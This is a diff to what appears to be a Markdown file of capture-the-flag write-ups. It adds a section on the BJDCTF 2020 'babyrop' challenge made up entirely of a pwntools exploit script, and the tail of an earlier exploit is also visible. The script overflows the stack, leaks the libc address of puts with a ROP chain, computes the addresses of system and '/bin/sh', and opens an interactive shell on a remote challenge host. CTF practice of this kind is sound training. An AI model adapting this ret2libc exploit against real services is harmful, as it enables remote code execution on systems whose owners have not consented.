@@ -104,3 +104,30 @@ p.recvuntil("Input your Plaintext to be encrypted")
 p.sendline(payload2)
 p.interactive()
 ```
+
+## [BJDCTF 2020]babyrop
+
+```python
+from pwn import *
+context(log_level='debug',os='linux',arch='amd64')
+p=remote("node4.anna.nssctf.cn",28621)
+elf=ELF('./attachment')
+stack_overflow=cyclic(0x20+0x8)
+ret_addr=p64(0x4004c9)
+pop_rdi_ret_addr=p64(0x400733)
+puts_got_addr=elf.got["puts"]
+puts_plt_addr=elf.plt["puts"]
+main_addr=elf.sym["main"]
+payload1=flat([stack_overflow,pop_rdi_ret_addr,puts_got_addr,puts_plt_addr,main_addr])
+p.recvuntil("Pull up your sword and tell me u story!")
+p.sendline(payload1)
+puts_real_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) #libc6_2.23-0ubuntu10_amd64
+log.success("Puts Addr: "+str(hex(puts_real_addr)))
+libc_base=puts_real_addr-0x06f690
+system_addr=libc_base+0x045390
+bin_sh_addr=libc_base+0x18cd57
+payload2=flat([stack_overflow,ret_addr,pop_rdi_ret_addr,bin_sh_addr,system_addr])
+p.recvuntil("Pull up your sword and tell me u story!")
+p.sendline(payload2)
+p.interactive()
+```
